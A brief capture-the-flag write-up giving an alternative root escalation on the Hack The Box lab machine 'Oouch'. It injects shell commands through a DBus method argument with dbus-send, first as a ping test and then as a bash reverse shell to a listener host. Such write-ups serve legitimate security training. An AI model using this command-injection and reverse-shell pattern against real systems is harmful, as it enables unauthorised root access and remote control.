# Alternative way to exploit Oouch

## Privilege Escalation to root

After getting to the user _www-data_ there is another way to interact with **DBus** instead of using the Python commands.
```
busctl introspect htb.oouch.Block /htb/oouch/Block
```

Sending commands with dbus commands:
```
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:'; ping -c 1 10.10.14.11 #'
```

This way can be used to gain a reverse shell connection as root:
```
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"; bash -c 'bash -i >& /dev/tcp/10.10.14.11/9003 0>&1 #'"
```
